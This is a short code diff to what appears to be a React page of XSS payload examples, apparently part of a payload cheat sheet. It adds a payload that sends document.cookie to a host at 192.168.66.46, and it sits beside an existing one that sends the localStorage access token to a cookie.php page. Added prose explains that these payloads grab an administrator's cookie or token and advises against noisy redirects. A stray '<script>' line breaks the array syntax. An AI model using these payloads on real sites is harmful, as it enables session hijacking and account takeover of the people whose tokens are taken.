@@ -18,7 +18,12 @@ export default (props) => {
 		{
 			title:
 				"<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
+		},
+		{
+			title:
+				"fetch(`http://192.168.66.46/${document.cookie}`)</script>"
 		}
+		<script>
 	];
 	const BasicXSS = [
 		{ title: "<script>alert('XSS')</script>" },
@@ -91,6 +96,8 @@ export default (props) => {
 				<Paragraph>
 					Obtains the administrator cookie or sensitive access token, the following payload will send it to a
 					controlled page.
+
+					Avoid using "document.location", as the first instance will redirect browser. Very noicy. Will also make further changes to the payload impossible. This is a last resort payloads.
 				</Paragraph>
 				{DataGrabber.map((k, i) => {
 					return (
